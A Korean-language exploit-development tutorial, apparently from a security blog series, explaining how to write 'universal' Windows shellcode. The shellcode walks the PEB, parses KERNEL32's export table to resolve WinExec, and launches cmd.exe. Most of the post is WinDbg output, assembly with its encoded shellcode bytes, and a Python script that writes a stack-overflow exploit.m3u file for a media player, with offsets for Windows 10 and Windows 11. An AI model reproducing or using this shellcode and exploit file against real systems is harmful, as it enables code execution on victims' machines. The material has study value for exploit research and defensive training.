---
title:  "Windows Stack Buffer Overflow 4 - Universal 셸코드 작성"
search: true
categories: 
  - Windows Userland
last_modified_at: 2025-06-06
comments: true 
published: true
---

- 익스플로잇에 성공하였으나, 문제점이 있다.
  - 환경이 변화하는 경우(Windows 업데이트 등) KERNEL32.dll의 `WinExec` 함수 오프셋이 변경되어 익스플로잇에 실패할 수 있다.
  - 어떤 환경에서든 성공할 수 있도록 Universal한 셸코드를 작성해야 한다.

- DLL은 자신이 어떤 함수들을 Export하고 있는지에 대한 정보를 PE 헤더에 저장해둔다. Export Table의 경우 `IMAGE_EXPORT_DIRECTORY` 구조체로 저장된다.
- `IMAGE_EXPORT_DIRECTORY`로의 오프셋은 `_IMAGE_OPTIONAL_HEADER`에 저장되어 있다.

- `_IMAGE_NT_HEADERS` 오프셋은 `_IMAGE_DOS_HEADER`에서 찾을 수 있다. (`e_lfanew`)
```
0:018> dt _IMAGE_DOS_HEADER 00000000`76150000
ntdll32!_IMAGE_DOS_HEADER
   +0x000 e_magic          : 0x5a4d
   +0x002 e_cblp           : 0x90
   +0x004 e_cp             : 3
   +0x006 e_crlc           : 0
   +0x008 e_cparhdr        : 4
   +0x00a e_minalloc       : 0
   +0x00c e_maxalloc       : 0xffff
   +0x00e e_ss             : 0
   +0x010 e_sp             : 0xb8
   +0x012 e_csum           : 0
   +0x014 e_ip             : 0
   +0x016 e_cs             : 0
   +0x018 e_lfarlc         : 0x40
   +0x01a e_ovno           : 0
   +0x01c e_res            : [4] 0
   +0x024 e_oemid          : 0
   +0x026 e_oeminfo        : 0
   +0x028 e_res2           : [10] 0
   +0x03c e_lfanew         : 0n248
```

- `_IMAGE_OPTIONAL_HEADER`는 _IMAGE_NT_HEADERS`의 끝에 붙어 있다.
```
0:018> dt _IMAGE_NT_HEADERS 76150000+f8
ntdll32!_IMAGE_NT_HEADERS
   +0x000 Signature        : 0x4550
   +0x004 FileHeader       : _IMAGE_FILE_HEADER
   +0x018 OptionalHeader   : _IMAGE_OPTIONAL_HEADER
```

- `IMAGE_EXPORT_DIRECTORY`는 `_IMAGE_OPTIONAL_HEADER`의 `DataDirectory` 배열의 가장 첫 번째 항목이다.

```
0:018> dt _IMAGE_OPTIONAL_HEADER 76150000+f8+18
ntdll32!_IMAGE_OPTIONAL_HEADER
   +0x000 Magic            : 0x10b
   +0x002 MajorLinkerVersion : 0xe ''
   +0x003 MinorLinkerVersion : 0x26 '&'
   +0x004 SizeOfCode       : 0x6c000
   +0x008 SizeOfInitializedData : 0x37000
   +0x00c SizeOfUninitializedData : 0
   +0x010 AddressOfEntryPoint : 0x15970
   +0x014 BaseOfCode       : 0x10000
   +0x018 BaseOfData       : 0x80000
   +0x01c ImageBase        : 0x76150000
   +0x020 SectionAlignment : 0x10000
   +0x024 FileAlignment    : 0x1000
   +0x028 MajorOperatingSystemVersion : 0xa
   +0x02a MinorOperatingSystemVersion : 0
   +0x02c MajorImageVersion : 0xa
   +0x02e MinorImageVersion : 0
   +0x030 MajorSubsystemVersion : 0xa
   +0x032 MinorSubsystemVersion : 0
   +0x034 Win32VersionValue : 0
   +0x038 SizeOfImage      : 0xf0000
   +0x03c SizeOfHeaders    : 0x1000
   +0x040 CheckSum         : 0xb1309
   +0x044 Subsystem        : 3
   +0x046 DllCharacteristics : 0x4140
   +0x048 SizeOfStackReserve : 0x40000
   +0x04c SizeOfStackCommit : 0x1000
   +0x050 SizeOfHeapReserve : 0x100000
   +0x054 SizeOfHeapCommit : 0x1000
   +0x058 LoaderFlags      : 0
   +0x05c NumberOfRvaAndSizes : 0x10
   +0x060 DataDirectory    : [16] _IMAGE_DATA_DIRECTORY

0:018> dt _IMAGE_DATA_DIRECTORY 76150000+f8+18+60
ntdll32!_IMAGE_DATA_DIRECTORY
   +0x000 VirtualAddress   : 0x959a0
   +0x004 Size             : 0xe8e0
```

- `IMAGE_EXPORT_DIRECTORY`에서 봐야 할 항목은 3가지가 있다.
  <img src="/assets/img/windows/sbof/5.png" class="post-image">
  - Address Table: Export된 함수들의 오프셋이 담겨 있는 테이블. `ImageBase + 0x959C8`
  - Name Pointer Table: Export된 함수들의 이름이 담겨 있는 테이블. `ImageBase + 0x973C4`
  - Ordinal Table: Export된 함수들의 오디널 번호가 담겨 있는 테이블. `ImageBase + 0x98DC0`

- 함수 이름 확인
```
0:018> dd 76150000+000973c4
00000000`761e73c4  00099b2a 00099b63 00099b96 00099ba5
00000000`761e73d4  00099bba 00099bdf 00099be8 00099bf1
00000000`761e73e4  00099c02 00099c13 00099c58 00099c7e
00000000`761e73f4  00099c9d 00099cbc 00099cc9 00099cdc
00000000`761e7404  00099cf4 00099d0f 00099d24 00099d41
00000000`761e7414  00099d80 00099dc1 00099dd4 00099de1
00000000`761e7424  00099df9 00099e13 00099e31 00099e68
00000000`761e7434  00099ead 00099ef8 00099f53 00099fa8
0:018> da 76150000+99b2a
00000000`761e9b2a  "AcquireSRWLockExclusive"
0:018> da 76150000+99b63
00000000`761e9b63  "AcquireSRWLockShared"
0:018> da 76150000+00099bdf
00000000`761e9bdf  "AddAtomA"
```
  - `AddAtomA` 함수를 찾고자 한다면, 인덱스 "5"

- 오디널 번호 확인
```
0:018> dw 76150000+98dc0
00000000`761e8dc0  0003 0004 0005 0006 0007 0008 0009 000a
00000000`761e8dd0  000b 000c 000d 000e 000f 0010 0011 0012
00000000`761e8de0  0013 0014 0015 0016 0017 0018 0019 001a
00000000`761e8df0  001b 001c 001d 001e 001f 0020 0021 0022
00000000`761e8e00  0023 0024 0025 0026 0027 0028 0029 002a
00000000`761e8e10  002b 002c 002d 002e 002f 0030 0031 0032
00000000`761e8e20  0033 0034 0035 0036 0037 0038 0039 003a
00000000`761e8e30  003b 003c 003d 003e 003f 0040 0041 0042
```
  - 인덱스 "5"는 오디널 "8"

- 함수 주소 확인
```
0:018> dd 76150000+959c8
00000000`761e59c8  00015d30 00099af8 0008234c 00099b42
00000000`761e59d8  00099b78 0002fd70 0001cdd0 0001f8c0
00000000`761e59e8  000541a0 00014260 0001f580 0001f590
00000000`761e59f8  00099c23 000330c0 00054300 00054360
00000000`761e5a08  0002fd90 00038420 0002fda0 0001d9e0
00000000`761e5a18  0002fdc0 0002dcf0 00099d5c 00099d9c
00000000`761e5a28  00040f90 0001f1b0 0001f1c0 0002fe00
00000000`761e5a38  0002fde0 00099e47 00099e85 00099ecd
0:018> u 76150000+000541a0
KERNEL32!AddAtomA:
00000000`761a41a0 8bff            mov     edi,edi
00000000`761a41a2 55              push    rbp
00000000`761a41a3 8bec            mov     ebp,esp
00000000`761a41a5 6a00            push    0
00000000`761a41a7 ff7508          push    qword ptr [rbp+8]
00000000`761a41aa 32d2            xor     dl,dl
00000000`761a41ac b101            mov     cl,1
00000000`761a41ae e8ea00fcff      call    KERNEL32!InternalAddAtom (00000000`7616429d)
```
  - 오디널 "8"의 값은 `0x541A0`
  - `ImageBase + 0x541A0` 주소는 `AddAtomA` 함수의 주소!

- 위 과정을 NULL 없는 셸코드로 작성하여 완성해보면 다음과 같다.

```
sub sp, 0x108

xor ecx, ecx
mov cl, 0x30           
mov esi, fs:[ecx]               ; fs 레지스터를 이용하여 _PEB 주소 가져오기

  
mov esi, [esi+0xc]              ; _PEB->_PEB_LDR_DATA
mov esi, [esi+0x14]             ; _PEB_LDR_DATA->_LDR_DATA_TABLE_ENTRY = Program

mov esi, [esi]                  ; NTDLL
mov esi, [esi]                  ; KERNEL32

mov esi, [esi+0x10]             ; KERNEL32->DllBase     

mov edi, [esi+0x3c]             ; _IMAGE_NT_HEADERS
add edi, esi
add edi, 0x78                   ; IMAGE_EXPORT_DIRECTORY
mov edi, [edi]
add edi, esi

mov ecx, edi
add cl, 0x20           
mov ecx, [ecx]
add ecx, esi
xor eax, eax
xor ebx, ebx

loop:
mov ebx, [ecx+4*eax]
mov edx, [esi+ebx]
cmp edx, 0x456E6957             ; "WinE" 문자열을 찾을 때까지 반복
je loop_out  
add ax, 1                       ; 반복문이 종료되면 ax 값은 인덱스 번호가 됨
jmp loop

loop_out:
xor ebx, ebx
mov ecx,edi
add cl, 0x24
mov ecx, [ecx]
add ecx, esi
mov bx, WORD PTR [ecx+2*eax]    ; 앞에서 구한 인덱스 번호를 이용하여 WinExec 함수의 오디널 번호 구하기

mov ecx, edi
add cl, 0x1c
mov ecx, [ecx]
add ecx, esi
mov ecx, [ecx+4*ebx]            ; 오디널 번호를 이용하여 함수의 주소 구하기
add esi, ecx                    ; esi = WinExec

xor ebx, ebx
push ebx
push 0x6578652e                 ; "C:\Windows\System32\cmd.exe"
push 0x646d635c
push 0x32336d65
push 0x74737953
push 0x5c73776f
push 0x646e6957
push 0x5c3a43FF

mov ebx, esp
add bl, 1
push 1
push ebx

call esi                        ; WinExec("C:\Windows\System32\cmd.exe", 1)
```

- 위 셸코드를 이용하여 m3u 파일을 다시 생성하고, 실행해보자.

```py
import os
if os.path.exists("exploit.m3u"): os.remove("exploit.m3u")

shellcode = b"\x66\x81\xEC\x08\x01\x31\xC9\xB1\x30\x64\x8B\x31\x8B\x76\x0C\x8B\x76\x14\x8B\x36\x8B\x36\x8B\x76\x10\x8B\x7E\x3C\x01\xF7\x83\xC7\x78\x8B\x3F\x01\xF7\x89\xF9\x80\xC1\x20\x8B\x09\x01\xF1\x31\xC0\x31\xDB\x8B\x1C\x81\x8B\x14\x1E\x81\xFA\x57\x69\x6E\x45\x74\x06\x66\x83\xC0\x01\xEB\xEC\x31\xDB\x89\xF9\x80\xC1\x24\x8B\x09\x01\xF1\x66\x8B\x1C\x41\x89\xF9\x80\xC1\x1C\x8B\x09\x01\xF1\x8B\x0C\x99\x01\xCE\x31\xDB\x53\x68\x2E\x65\x78\x65\x68\x5C\x63\x6D\x64\x68\x65\x6D\x33\x32\x68\x53\x79\x73\x74\x68\x6F\x77\x73\x5C\x68\x57\x69\x6E\x64\x68\xFF\x43\x3A\x5C\x89\xE3\x80\xC3\x01\x6A\x01\x53\xFF\xD6"


with open("exploit.m3u", "wb") as f:
	#### Windows 11 24H2
	# payload = b"\x90"*(26000+(0x57-0x42)*4+2 - len(shellcode))
	#### Windows 10 1703
	payload = b"\x90"*(26000+(0x58-0x42)*4+1 - len(shellcode))
	
	payload += shellcode
	payload += b"\x40\xef\x16\x00"
	payload += b"B"*(28000-len(payload))
	f.write(payload)
```

### 실행 결과(Windows 10 1703 Build 15063.0)
- Windows 11에서 동작했던 셸코드가 Windows 10에서도 정상 동작하는 것을 확인할 수 있다.
<img src="/assets/img/windows/sbof/2.gif" class="post-image">